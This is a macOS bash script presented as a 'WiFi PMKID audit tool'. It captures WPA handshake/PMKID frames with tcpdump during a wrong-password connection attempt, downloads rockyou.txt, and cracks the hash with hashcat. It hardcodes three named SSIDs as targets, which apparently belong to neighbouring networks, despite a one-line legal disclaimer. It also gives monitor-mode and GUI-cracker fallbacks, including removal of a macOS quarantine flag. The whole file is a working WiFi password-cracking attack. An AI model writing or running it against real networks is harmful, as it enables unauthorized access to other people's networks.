#!/bin/bash
# ============================================================
# WiFi PMKID Audit Tool — macOS M1 (no USB adapter needed)
# 
# Captures PMKID via EAPOL M1 during a wrong-password connection
# attempt. No monitor mode required. No deauth required.
# No asking anyone to turn WiFi on/off.
#
# LEGAL: Only use on networks you own or have written permission to test.
# ============================================================

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Config
CAPTURE_DIR="/tmp/wifi-audit"
WORDLIST="/tmp/rockyou.txt"
HASHCAT_RULES="/opt/homebrew/Cellar/hashcat/7.1.2/share/doc/hashcat/rules/best64.rule"

mkdir -p "$CAPTURE_DIR"

print_banner() {
    echo -e "${CYAN}"
    echo "  ╔═══════════════════════════════════════════════════╗"
    echo "  ║     WiFi PMKID Audit — macOS M1 (no adapter)      ║"
    echo "  ║     Capture → Extract → Crack                     ║"
    echo "  ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_deps() {
    echo -e "${YELLOW}[1/5] Checking dependencies...${NC}"
    local missing=0
    
    for cmd in tcpdump hcxpcapngtool hashcat; do
        if command -v $cmd &>/dev/null; then
            echo -e "  ${GREEN}✓${NC} $cmd ($(command -v $cmd))"
        else
            echo -e "  ${RED}✗${NC} $cmd NOT FOUND"
            missing=1
        fi
    done
    
    if [ ! -f "$WORDLIST" ]; then
        echo -e "  ${RED}✗${NC} rockyou.txt NOT FOUND at $WORDLIST"
        echo -e "  ${YELLOW}  Downloading rockyou.txt...${NC}"
        curl -sL -o "$WORDLIST" "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
        if [ -f "$WORDLIST" ]; then
            echo -e "  ${GREEN}✓${NC} rockyou.txt downloaded ($(wc -l < "$WORDLIST") lines)"
        else
            echo -e "  ${RED}✗${NC} Failed to download rockyou.txt"
            missing=1
        fi
    else
        echo -e "  ${GREEN}✓${NC} rockyou.txt ($(wc -l < "$WORDLIST") lines)"
    fi
    
    if [ $missing -eq 1 ]; then
        echo -e "\n${RED}Missing dependencies. Install with:${NC}"
        echo "  brew install hashcat hcxtools"
        exit 1
    fi
    echo ""
}

scan_networks() {
    echo -e "${YELLOW}[2/5] Scanning WiFi networks...${NC}"
    echo -e "  ${CYAN}Listing nearby WiFi networks:${NC}\n"
    
    # Use system_profiler for network discovery on macOS 26
    system_profiler SPAirPortDataType 2>/dev/null | grep -A2 "Current Network Information" | head -20
    echo ""
    
    # Alternative: use wdutil or networksetup
    echo -e "  ${CYAN}Or check your WiFi menu bar for available networks.${NC}"
    echo -e "  ${CYAN}Target networks: woody / projex business / ramazan${NC}\n"
}

capture_pmkid() {
    local target_ssid="$1"
    local capture_file="$CAPTURE_DIR/capture_$(date +%Y%m%d_%H%M%S).pcap"
    local hash_file="$CAPTURE_DIR/hash_$(date +%Y%m%d_%H%M%S).hc22000"
    
    echo -e "${YELLOW}[3/5] Capturing PMKID for: $target_ssid${NC}"
    echo ""
    echo -e "  ${CYAN}HOW IT WORKS:${NC}"
    echo "  1. tcpdump captures ALL traffic on en0 (including EAPOL)"
    echo "  2. You connect to '$target_ssid' with a WRONG password"
    echo "  3. The AP sends EAPOL M1 — which contains the PMKID"
    echo "  4. Connection fails (wrong password) — but we got the PMKID"
    echo "  5. We extract the PMKID and crack it offline"
    echo ""
    echo -e "  ${YELLOW}IMPORTANT:${NC}"
    echo "  • Disconnect from your current WiFi FIRST"
    echo "  • Use Option+Click WiFi icon → Disconnect"
    echo "  • The wrong password must be at least 8 characters"
    echo ""
    
    read -p "$(echo -e ${GREEN}'Press ENTER when ready to start capture...'${NC})"
    
    # Start tcpdump in background
    echo -e "\n  ${YELLOW}Starting tcpdump on en0...${NC}"
    echo -e "  ${CYAN}sudo tcpdump -i en0 -w $capture_file -s 0${NC}"
    echo ""
    
    sudo tcpdump -i en0 -w "$capture_file" -s 0 &
    local tcpdump_pid=$!
    
    echo -e "  ${GREEN}✓${NC} tcpdump started (PID: $tcpdump_pid)"
    echo ""
    echo -e "  ${YELLOW}NOW: Connect to '$target_ssid' with a WRONG password${NC}"
    echo -e "  ${CYAN}(System Settings → WiFi → $target_ssid → enter any 8+ char password)${NC}"
    echo ""
    echo -e "  ${YELLOW}Waiting for EAPOL exchange...${NC}"
    echo "  Press ENTER after the connection attempt FAILS"
    read -p ""
    
    # Stop tcpdump
    sudo kill $tcpdump_pid 2>/dev/null || true
    wait $tcpdump_pid 2>/dev/null || true
    echo -e "\n  ${GREEN}✓${NC} tcpdump stopped"
    echo -e "  ${CYAN}Capture file: $capture_file ($(stat -f%z "$capture_file" 2>/dev/null || echo 0) bytes)${NC}"
    
    # Extract PMKID
    echo ""
    echo -e "${YELLOW}Extracting PMKID/hash from capture...${NC}"
    echo -e "  ${CYAN}hcxpcapngtool -o $hash_file $capture_file${NC}"
    echo ""
    
    hcxpcapngtool -o "$hash_file" "$capture_file" 2>&1 || true
    
    if [ -f "$hash_file" ] && [ -s "$hash_file" ]; then
        echo ""
        echo -e "  ${GREEN}✓ Hash file created: $hash_file${NC}"
        echo -e "  ${CYAN}Content:${NC}"
        cat "$hash_file"
        echo ""
        
        # Check if PMKID (WPA*01*) or EAPOL (WPA*02*)
        if grep -q 'WPA\*01' "$hash_file"; then
            echo -e "  ${GREEN}✓ PMKID found! (clientless attack succeeded)${NC}"
        elif grep -q 'WPA\*02' "$hash_file"; then
            echo -e "  ${YELLOW}⚠ EAPOL handshake captured (not PMKID)${NC}"
            echo -e "  ${CYAN}This is still crackable!${NC}"
        else
            echo -e "  ${RED}✗ No PMKID or EAPOL found in capture${NC}"
            echo -e "  ${YELLOW}The AP may not include PMKID in EAPOL M1.${NC}"
            echo -e "  ${YELLOW}Try again, or try a different network.${NC}"
            return 1
        fi
        
        echo "$hash_file"
        return 0
    else
        echo ""
        echo -e "  ${RED}✗ No hash file created — capture may be empty or no EAPOL frames captured${NC}"
        echo -e "  ${YELLOW}Possible causes:${NC}"
        echo "  1. Did not disconnect from current WiFi before capture"
        echo "  2. Connection attempt was too fast (before tcpdump started)"
        echo "  3. macOS filtered EAPOL frames from BPF"
        echo "  4. AP did not send EAPOL M1 with PMKID"
        echo ""
        echo -e "  ${YELLOW}Try Plan C: monitor mode capture${NC}"
        return 1
    fi
}

crack_hash() {
    local hash_file="$1"
    
    echo ""
    echo -e "${YELLOW}[4/5] Cracking hash with hashcat...${NC}"
    echo ""
    echo -e "  ${CYAN}hashcat -m 22000 $hash_file $WORDLIST${NC}"
    echo ""
    echo -e "  ${YELLOW}Note: M1 CPU-only mode (~10-50k keys/s)${NC}"
    echo -e "  ${CYAN}rockyou.txt has 14.3M passwords — may take 5-30 min${NC}"
    echo ""
    
    # Try with rules first for better coverage
    if [ -f "$HASHCAT_RULES" ]; then
        echo -e "  ${YELLOW}Running with best64.rule for better coverage...${NC}"
        hashcat -m 22000 "$hash_file" "$WORDLIST" -r "$HASHCAT_RULES" --force 2>&1 || true
    else
        hashcat -m 22000 "$hash_file" "$WORDLIST" --force 2>&1 || true
    fi
    
    # Show cracked passwords
    echo ""
    echo -e "${YELLOW}Showing cracked passwords...${NC}"
    hashcat -m 22000 "$hash_file" --show 2>&1 || true
}

show_results() {
    echo ""
    echo -e "${YELLOW}[5/5] Results${NC}"
    echo ""
    echo -e "  Capture files: $CAPTURE_DIR/"
    echo -e "  Wordlist: $WORDLIST"
    echo ""
    echo -e "  ${CYAN}To re-run cracking with different wordlist:${NC}"
    echo "  hashcat -m 22000 /tmp/wifi-audit/hash_*.hc22000 /path/to/your/wordlist.txt"
    echo ""
    echo -e "  ${CYAN}To use metal-crack (M1 GPU, ~200k PMKs/s):${NC}"
    echo "  git clone https://github.com/RLabs-Inc/metal-crack"
    echo "  cd metal-crack && swift build && swift run"
    echo ""
}

# ============================================================
# Main
# ============================================================
print_banner
check_deps
scan_networks

# Target selection
echo -e "${YELLOW}Select target network:${NC}"
echo "  1) projex business"
echo "  2) woody"
echo "  3) ramazan"
echo "  4) Other (enter SSID manually)"
echo ""
read -p "Choice [1-4]: " choice

case $choice in
    1) TARGET="projex business" ;;
    2) TARGET="woody" ;;
    3) TARGET="ramazan" ;;
    4) read -p "Enter SSID: " TARGET ;;
    *) echo "Invalid choice"; exit 1 ;;
esac

echo ""
echo -e "Target: ${GREEN}$TARGET${NC}"
echo ""

# Capture
HASH_FILE=$(capture_pmkid "$TARGET" 2>/dev/null) || true

if [ -z "$HASH_FILE" ] || [ ! -f "$HASH_FILE" ]; then
    # Find the most recent hash file
    HASH_FILE=$(ls -t "$CAPTURE_DIR"/hash_*.hc22000 2>/dev/null | head -1)
fi

if [ -n "$HASH_FILE" ] && [ -f "$HASH_FILE" ] && [ -s "$HASH_FILE" ]; then
    crack_hash "$HASH_FILE"
else
    echo ""
    echo -e "${RED}No hash captured. Trying fallback...${NC}"
    echo ""
    echo -e "${YELLOW}Plan C: Monitor Mode Capture${NC}"
    echo "  Try: sudo tcpdump -i en0 -I -w /tmp/wifi-audit/monitor.pcap -s 0"
    echo "  (The -I flag enables monitor mode on macOS)"
    echo "  Then wait for any client to connect to the target AP"
    echo ""
    echo -e "${YELLOW}Plan D: Use BrutiFi GUI${NC}"
    echo "  xattr -dr com.apple.quarantine /Applications/BrutiFi.app"
    echo "  open /Applications/BrutiFi.app"
fi

show_results
